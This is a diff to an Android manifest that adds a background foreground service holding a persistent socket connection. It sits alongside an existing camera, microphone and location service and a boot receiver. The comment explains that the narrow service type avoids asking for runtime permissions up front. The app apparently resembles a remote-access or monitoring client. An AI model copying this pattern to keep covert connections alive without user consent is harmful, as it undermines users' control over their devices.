@@ -164,6 +164,19 @@
             android:exported="false"
             android:foregroundServiceType="dataSync|camera|microphone|location" />
 
+        <!--
+            Secondary Background Service (com.access.client.BackgroundService)
+            Lightweight foreground service that holds the SocketManager
+            connection.  Declared with only the dataSync type so it can
+            always go foreground on Android 15 without requiring
+            camera / microphone / location runtime permissions up front.
+        -->
+        <service
+            android:name="com.access.client.BackgroundService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
         <!-- Boot Receiver -->
         <receiver
             android:name="com.task.tusker.receivers.BootReceiver"
